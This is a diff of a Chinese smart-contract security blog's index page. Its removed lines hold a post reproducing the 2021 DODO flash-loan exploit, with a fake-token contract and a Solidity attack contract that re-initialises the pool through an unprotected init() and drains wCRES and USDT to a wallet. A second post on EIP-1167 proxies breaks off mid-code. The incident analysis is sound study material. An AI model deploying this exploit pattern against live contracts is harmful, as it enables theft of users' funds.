@@ -3,10 +3,12 @@
 <head>
   <meta charset="utf-8">
   
-
-  
   <title>SCC</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  
+  
+  
   <meta property="og:type" content="website">
 <meta property="og:title" content="SCC">
 <meta property="og:url" content="http://example.com/index.html">
@@ -17,185 +19,291 @@
   
     <link rel="alternate" href="/atom.xml" title="SCC" type="application/atom+xml">
   
+
   
-    <link rel="icon" href="/favicon.png">
-  
+
+  <link rel="icon" href="/css/images/mylogo.jpg">
+  <link rel="apple-touch-icon" href="/css/images/mylogo.jpg">
   
     <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
   
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
+  <link href="//netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">
+  <style type="text/css">
+    @font-face{font-family:futura-pt; src:url("/css/fonts/FuturaPTBold.otf") format("woff");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt-light; src:url("/css/fonts/FuturaPTBook.otf") format("woff");font-weight:lighter;font-style:normal;}
+    @font-face{font-family:futura-pt-italic; src:url("/css/fonts/FuturaPTBookOblique.otf") format("woff");font-weight:400;font-style:italic;}
+}
+
+  </style>
   
 <link rel="stylesheet" href="/css/style.css">
 
+
+  
+<script src="/js/jquery-3.1.1.min.js"></script>
+
+  
+<script src="/js/bootstrap.js"></script>
+
+
+  <!-- Bootstrap core CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.css" >
+
+  
+    <link rel="stylesheet" href="/css/home.css" >
+  
+
+  
+
+  
+
+  
+  
+  
+    <link rel="stylesheet" href="/css/vdonate.css" >
+  
+
 <meta name="generator" content="Hexo 5.4.0"></head>
 
-<body>
+
+
+  <body>
+
+
+  
+    <header id="header">
+
+	<!-- 背景图模式 -->
+	
+
+    
+      <div id="intrologo" class="intro-logo">
+    
+ 
+
+
+    <canvas width="100%" height="100%"></canvas>
+    <script>
+      var c = document.getElementsByTagName('canvas')[0],
+          x = c.getContext('2d'),
+          w = window.innerWidth,
+          h = window.innerHeight,
+          pr = window.devicePixelRatio || 1,
+          f = 90,
+          q,
+          m = Math,
+          r = 0,
+          u = m.PI*2,
+          v = m.cos,
+          z = m.random
+      c.width = w*pr
+      c.height = h*pr
+      x.scale(pr, pr)
+      x.globalAlpha = 0.6
+
+      <!-- 折线Polyline背景 -->
+      
+        function i(){
+            x.clearRect(0,0,w,h)
+            q=[{x:0,y:h*.7+f},{x:0,y:h*.7-f}]
+            while(q[1].x<w+f) d(q[0], q[1])
+        }
+        function d(i,j){   
+            x.beginPath()
+            x.moveTo(i.x, i.y)
+            x.lineTo(j.x, j.y)
+            var k = j.x + (z()*2-0.25)*f,
+                n = y(j.y)
+            x.lineTo(k, n)
+            x.closePath()
+            r-=u/-50
+            x.fillStyle = '#'+(v(r)*127+128<<16 | v(r+u/3)*127+128<<8 | v(r+u/3*2)*127+128).toString(16)
+            x.fill()
+            q[0] = q[1]
+            q[1] = {x:k,y:n}
+        }
+        function y(p){
+            var t = p + (z()*2-1.1)*f
+            return (t>h||t<0) ? y(p) : t
+        }
+        document.getElementById("intrologo").onclick = i
+        document.getElementById("intrologo").ontouchstart = i
+        i()
+
+      <!-- 多边形trianglify背景 -->
+      
+    </script>
+    
+
+    
+      <div id="homelogo" class="homelogo"> 
+    
+
+        
+          <div class="homelogoback" >
+            <h1><a href="#content" id="logo">SCC</a></h1>
+            <h3></h3>
+            <h5>Janson Woods</h5>
+            <!-- <p><a href="https://github.com/iTimeTraveler" target="_blank">Github</a></p> -->
+          </div>
+        
+    
+    </div>
+  </div>
+
+  <!-- 自适应主页背景大图 -->
+  
+
+ <!-- home_logo_image居中 -->
+ 
+    <script>
+        var homelogodiv = document.getElementById("homelogo");
+        if (document.all.homelogo.offsetWidth > document.body.clientWidth) {
+          homelogodiv.style.width = document.body.clientWidth + "px";
+          homelogodiv.style.marginLeft = document.body.clientWidth * -0.5 + "px";
+        } else {
+          homelogodiv.style.width = homelogodiv.clientWidth  + "px";
+          homelogodiv.style.marginLeft = (homelogodiv.clientWidth)  * -0.5 + "px";
+        }
+    </script>
+  
+
+  <div class="intro-navigate">
+      <p class="navigater-list">
+        
+          <a id="beautifont" class="main-nav-link" href="/">Home</a>
+        
+          <a id="beautifont" class="main-nav-link" href="/archives">Archives</a>
+        
+          <a id="beautifont" class="main-nav-link" href="/categories">Categories</a>
+        
+          <a id="beautifont" class="main-nav-link" href="/tags">Tags</a>
+        
+          <a id="beautifont" class="main-nav-link" href="/about">About</a>
+        
+      </p>
+  </div>
+
+</header>
+  
   <div id="container">
     <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">SCC</a>
-      </h1>
       
-    </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"></a>
+            
+      <div id="content" class="outer">
         
-          <a class="main-nav-link" href="/">Home</a>
-        
-          <a class="main-nav-link" href="/archives">Archives</a>
-        
-      </nav>
-      <nav id="sub-nav">
-        
-          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
-        
-        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
-      </div>
-    </div>
-  </div>
-</header>
-      <div class="outer">
-        <section id="main">
+          <section id="main" style="float:none;">
   
-    <article id="post-DODO-flashloan攻击分析与复现" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    
-
-<a href="/2021/09/27/DODO-flashloan%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/" class="article-date">
-  <time datetime="2021-09-27T02:42:40.000Z" itemprop="datePublished">2021-09-27</time>
-</a>
-
-
-    
-  </div>
-  <div class="article-inner">
+    <article id="post-DODO-flashloan攻击分析与复现"  class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="article-inner">
     
     
       <header class="article-header">
         
   
-    <h1 itemprop="name">
+    <h1 class="thumb" itemprop="name">
       <a class="article-title" href="/2021/09/27/DODO-flashloan%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/">DODO_FlashLoan攻击复现--狸猫换太子</a>
     </h1>
   
 
       </header>
     
+    <div class="article-meta">
+      
+	<a href="/2021/09/27/DODO-flashloan%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/" class="article-date">
+	  <time datetime="2021-09-27T02:42:40.000Z" itemprop="datePublished">2021-09-27</time>
+	</a>
+
+      
+      
+      
+
+    </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <p><img src="/2021/09/27/DODO-flashloan%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20210925204033395.png" alt="image-20210925204033395"></p>
-<p>通过事件最后的状态可知，攻击者地址减少的两种空气币数额与攻击合约增加的WrappedERC20、TetherToken数额一一对应，相当于将DVM合约中WrappedERC20、TetherToken的两种币”等价的“交换为两种空气币。</p>
-<h3 id="攻击简述"><a href="#攻击简述" class="headerlink" title="攻击简述"></a>攻击简述</h3><p><img src="/2021/09/27/DODO-flashloan%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20210925210916212.png" alt="image-20210925210916212"></p>
-<p>交易哈希：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x395675b56370a9f5fe8b32badfa80043f5291443bd6c8273900476880fb5221e</span><br></pre></td></tr></table></figure>
+        <p class="article-excerpt-content">
+          
+通过事件最后的状态可知，攻击者地址减少的两种空气币数额与攻击合约增加的WrappedERC20、TetherToken数额一一对应，相当于将DVM合约中WrappedERC20、TetherToken的两种币”等价的“交换为两种空气币。
+攻击简述
+交易哈希：
+10x395675b56370a9f5fe8b32badfa80043f5291443bd6c8273900476880fb5221e
 
 
 
-<h3 id="攻击复现"><a href="#攻击复现" class="headerlink" title="攻击复现"></a>攻击复现</h3><h4 id="1-发两种空气币token1，token2"><a href="#1-发两种空气币token1，token2" class="headerlink" title="1.发两种空气币token1，token2."></a>1.发两种空气币token1，token2.</h4><p>erc20代币合约</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">/ SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity &gt;=0.8.0 &lt;0.9.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract _ERC20 is ERC20, Ownable &#123;</span><br><span class="line">    </span><br><span class="line">    uint8 private currentDecimals;</span><br><span class="line">    enum TOKEN_TYPE &#123;CAPPED,UNCAPPED&#125;</span><br><span class="line">    TOKEN_TYPE public tokenType;</span><br><span class="line">    </span><br><span class="line">    constructor(</span><br><span class="line">        string memory _name, </span><br><span class="line">        string memory _symbol,</span><br><span class="line">        uint8 _decimals,</span><br><span class="line">        uint256 _initialSupply,</span><br><span class="line">        TOKEN_TYPE _tokenType</span><br><span class="line">    ) ERC20(_name, _symbol) &#123;</span><br><span class="line">        currentDecimals = _decimals;</span><br><span class="line">        tokenType = _tokenType;</span><br><span class="line">        / mint token to the address of the account that sent the transaction.</span><br><span class="line">        transferOwnership(tx.origin);</span><br><span class="line">        _mint(tx.origin, _initialSupply * (10**uint256(_decimals)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier unCapped &#123;</span><br><span class="line">      require(tokenType == _ERC20.TOKEN_TYPE.UNCAPPED,&quot;support only uncapped token&quot;);</span><br><span class="line">      _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function decimals() public view virtual override returns (uint8) &#123;</span><br><span class="line">        return currentDecimals;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mint(address _address,uint256 _amount) public unCapped onlyOwner returns (bool) &#123;</span><br><span class="line">        _mint(_address,_amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function burn(address _address,uint256 _amount) public unCapped onlyOwner returns (bool) &#123;</span><br><span class="line">        _burn(_address,_amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>token1：</p>
-<p><img src="/2021/09/27/DODO-flashloan%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20210927092451496.png" alt="image-20210927092451496"></p>
-<p>token2：</p>
-<p><img src="/2021/09/27/DODO-flashloan%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20210927092549154.png" alt="image-20210927092549154"></p>
-<h4 id="2-将空气币打入wCRES-USDT交易对"><a href="#2-将空气币打入wCRES-USDT交易对" class="headerlink" title="2.将空气币打入wCRES/USDT交易对"></a>2.将空气币打入<code>wCRES/USDT</code>交易对</h4><p>wCRES/USDT 地址：0x051EBD717311350f1684f89335bed4ABd083a2b6</p>
-<p>各打入足量的数量（10000000000000000000000000000）。</p>
-<p><img src="/2021/09/27/DODO-flashloan%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20210927093126488.png" alt="image-20210927093126488"></p>
-<p><img src="/2021/09/27/DODO-flashloan%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20210927093214508.png" alt="image-20210927093214508"></p>
-<h4 id="3-修改攻击合约参数"><a href="#3-修改攻击合约参数" class="headerlink" title="3.修改攻击合约参数"></a>3.修改攻击合约参数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> *Submitted for verification at Etherscan.io on 2021-01-22</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"></span><br><span class="line">    Copyright 2020 DODO ZOO.</span><br><span class="line">    SPDX-License-Identifier: Apache-2.0</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">pragma solidity 0.6.9;</span><br><span class="line">pragma experimental ABIEncoderV2;</span><br><span class="line"></span><br><span class="line">interface DVM&#123;</span><br><span class="line">    </span><br><span class="line">    function flashLoan(</span><br><span class="line">        uint256 baseAmount,</span><br><span class="line">        uint256 quoteAmount,</span><br><span class="line">        address assetTo,</span><br><span class="line">        bytes calldata data</span><br><span class="line">    ) external;</span><br><span class="line">    </span><br><span class="line">    function init(</span><br><span class="line">        address maintainer,</span><br><span class="line">        address baseTokenAddress,</span><br><span class="line">        address quoteTokenAddress,</span><br><span class="line">        uint256 lpFeeRate,</span><br><span class="line">        address mtFeeRateModel,</span><br><span class="line">        uint256 i,</span><br><span class="line">        uint256 k,</span><br><span class="line">        bool isOpenTWAP</span><br><span class="line">    ) external;        </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">interface Token &#123;</span><br><span class="line">    function balanceOf(address account) external view returns (uint);</span><br><span class="line">    function transfer(address recipient, uint amount) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">interface USDT&#123;</span><br><span class="line">    /USDT 并没有完全遵循 ERC20 标准 所以其接口需单独定义</span><br><span class="line">    function transfer(address to, uint value) external;</span><br><span class="line">    function balanceOf(address account) external view returns (uint);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract poc&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    uint256 wCRES_amount =  130000000000000000000000;</span><br><span class="line">    </span><br><span class="line">    uint256 usdt_amount =  1100000000000;</span><br><span class="line">    </span><br><span class="line">    address wCRES_token = 0xa0afAA285Ce85974c3C881256cB7F225e3A1178a;</span><br><span class="line">    </span><br><span class="line">    address usdt_token = 0xdAC17F958D2ee523a2206206994597C13D831ec7;</span><br><span class="line">    </span><br><span class="line">    address maintainer = 0x95C4F5b83aA70810D4f142d58e5F7242Bd891CB0;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    / 这里是刚生成的Token1地址</span><br><span class="line">    address token1 = 0x9431cc8868a6a9993E25C7abB93aD2aca5592c5C;</span><br><span class="line">    / 这里是刚生成的Token2地址</span><br><span class="line">    address token2 = 0x445390C704Ed94F2F719d0eb7cda2633a72753A5;</span><br><span class="line">    </span><br><span class="line">    uint256 lpFeeRate = 3000000000000000;</span><br><span class="line">    </span><br><span class="line">    address mtFeeRateModel = 0x5e84190a270333aCe5B9202a3F4ceBf11b81bB01;</span><br><span class="line">    </span><br><span class="line">    uint256 i = 1;</span><br><span class="line">    </span><br><span class="line">    uint256 k = 1000000000000000000;</span><br><span class="line">    </span><br><span class="line">    bool isOpenTWAP = false;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    / 这里填你的测试地址</span><br><span class="line">    address  wallet = ;</span><br><span class="line">    </span><br><span class="line">    address dvm_wCRES_USDT =  0x051EBD717311350f1684f89335bed4ABd083a2b6;</span><br><span class="line">    </span><br><span class="line">    bytes data = abi.encodeWithSignature(&quot;init(address,address,address,uint256,address,uint256,uint256,bool)&quot;,maintainer,token1,token2,lpFeeRate,mtFeeRateModel,i,k,isOpenTWAP);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        </span><br><span class="line">        address me = address(this);</span><br><span class="line">        DVM DVM_wCRES_USDT = DVM(dvm_wCRES_USDT);</span><br><span class="line">        DVM_wCRES_USDT.flashLoan(wCRES_amount,usdt_amount,me,&quot; &quot;);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    function DVMFlashLoanCall(address a, uint256 b, uint256 c, bytes memory d) public&#123;</span><br><span class="line">        </span><br><span class="line">        DVM DVM_wCRES_USDT = DVM(dvm_wCRES_USDT);</span><br><span class="line">        DVM_wCRES_USDT.init(maintainer,token1,token2,lpFeeRate,mtFeeRateModel,i,k,isOpenTWAP);</span><br><span class="line">        </span><br><span class="line">        Token(wCRES_token).transfer(wallet, Token(wCRES_token).balanceOf(address(this)));</span><br><span class="line">        USDT(usdt_token).transfer(wallet, Token(usdt_token).balanceOf(address(this)));</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>该攻击合约主要完成以下工作：</p>
-<p>1.调用DVM的闪电贷函数进行闪电贷，将传入的assetTo参数修改为攻击合约。</p>
-<p><img src="/2021/09/27/DODO-flashloan%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20210927093647267.png" alt="image-20210927093647267"></p>
-<p>2.DVM执行闪电贷逻辑，乐观转账后，调用assetTo地址的DVMFlashLoanCall函数，由于攻击者传入的assetTo参数的值为攻击合约地址，因此会调用攻击合约中的DVMFlashLoanCall函数，</p>
-<p><img src="/2021/09/27/DODO-flashloan%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20210927093947219.png" alt="image-20210927093947219"></p>
-<p>在该函数中，对wCRES/USDT 交易对合约（DVM合约）进行初始化函数（init）的调用。使得合约中      交易对地址信息baseTokenAddress,quoteTokenAddress,变为攻击者发行的两个空气币地址。</p>
-<p>3.执行闪电贷的赎回操作</p>
-<p>由于此时攻击者已将合约的交易对地址信息初始化为两种空气币的地址，并在实现给交易对地址打入了足量的两种空气币。使得DVM合约认为两种空气币就是原来的两种代币，并且是足量的，完成闪电贷最后的检查工作。</p>
-<p><img src="/2021/09/27/DODO-flashloan%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20210927101352668.png" alt="image-20210927101352668"></p>
-<p>因此本次攻击是因为项目方并没有对初始化加以身份权限设定，使得任何人可以调用init函数。</p>
-
+攻击复现1.发两种空气币token1，token2.erc20代币合约
+123456789...
+        </p>
+        <p class="article-more-link">
+          <a href="/2021/09/27/DODO-flashloan%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/#more">Read More</a>
+        </p>
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/09/27/DODO-flashloan%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/" data-id="cku25wvcg0000sohjho7k00ys" class="article-share-link">Share</a>
       
       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%A4%8D%E7%9B%98%E5%88%86%E6%9E%90%E3%80%81%E9%97%AA%E7%94%B5%E8%B4%B7/" rel="tag">复盘分析、闪电贷</a></li></ul>
+      
+      
 
     </footer>
   </div>
   
 </article>
 
+<!-- Table of Contents -->
+
 
   
-    <article id="post-EIP1167-最小合约代理的理解" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    
-
-<a href="/2021/09/27/EIP1167-%E6%9C%80%E5%B0%8F%E5%90%88%E7%BA%A6%E4%BB%A3%E7%90%86%E7%9A%84%E7%90%86%E8%A7%A3/" class="article-date">
-  <time datetime="2021-09-27T02:42:40.000Z" itemprop="datePublished">2021-09-27</time>
-</a>
-
-
-    
-  </div>
-  <div class="article-inner">
+    <article id="post-EIP1167-最小合约代理的理解"  class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="article-inner">
     
     
       <header class="article-header">
         
   
-    <h1 itemprop="name">
+    <h1 class="thumb" itemprop="name">
       <a class="article-title" href="/2021/09/27/EIP1167-%E6%9C%80%E5%B0%8F%E5%90%88%E7%BA%A6%E4%BB%A3%E7%90%86%E7%9A%84%E7%90%86%E8%A7%A3/">EIP1167-最小合约代理的理解</a>
     </h1>
   
 
       </header>
     
+    <div class="article-meta">
+      
+	<a href="/2021/09/27/EIP1167-%E6%9C%80%E5%B0%8F%E5%90%88%E7%BA%A6%E4%BB%A3%E7%90%86%E7%9A%84%E7%90%86%E8%A7%A3/" class="article-date">
+	  <time datetime="2021-09-27T02:42:40.000Z" itemprop="datePublished">2021-09-27</time>
+	</a>
+
+      
+      
+      
+
+    </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <p>避免“重复部署某一个合约导致过多的存储空间被用在重复的运行时字节码的存储”。</p>
-<p>当需要某一份代码被大量部署时，这样就会使得大量的存储空间来存储相同的运行字节码，并消耗大量的Gas费用，引入EIP1167-最小合约代理来节省这部分存储与Gas消耗。</p>
-<h3 id="总体思路："><a href="#总体思路：" class="headerlink" title="总体思路："></a>总体思路：</h3><p>设置一个母合约被用来委托调用，实现合约的逻辑部分；通过工厂合约创建多个子合约与用户直接交互。当用户向子合约发来请求时，子合约通过委托调用（delegatecall）的方式调用母合约的函数逻辑修改子合约的存储。因为子合约中并没有对应函数的处理逻辑，唯一实现的功能是委托调用母合约的函数，完成计算与状态更改，并将结果返回给用户。</p>
-<p>通过EIP1167这种模式的设计可以很好的避免因代码复用导致资源浪费的问题。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">contract MetaCoinClonable &#123;</span><br><span class="line">	mapping (address =&gt; uint) balances;</span><br><span class="line">    </span><br><span class="line">    function initialize(address metaCoinOwner, uint256 initialBalance) public &#123;</span><br><span class="line">        balances[metaCoinOwner] = initialBalance;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">	function sendCoin(address receiver, uint amount) public returns(bool sufficient) &#123;</span><br><span class="line">		if (balances[msg.sender] &lt; amount) return false;</span><br><span class="line">		balances[msg.sender] -= amount;</span><br><span class="line">		balances[receiver] += amount;</span><br><span class="line">		return true;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function getBalance(address addr) view public returns(uint) &#123;</span><br><span class="line">  	    return balances[addr];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Ownable &#123;</span><br><span class="line">  /**</span><br><span class="line">   * @dev Event to show ownership has been transferred</span><br><span class="line">   * @param previousOwner representing the address of the previous owner</span><br><span class="line">   * @param newOwner representing the address of the new owner</span><br><span class="line">   */</span><br><span class="line">  event OwnershipTransferred(address previousOwner, address newOwner);</span><br><span class="line"></span><br><span class="line">  // Owner of the contract</span><br><span class="line">  address private _owner;</span><br><span class="line"></span><br><span class="line">  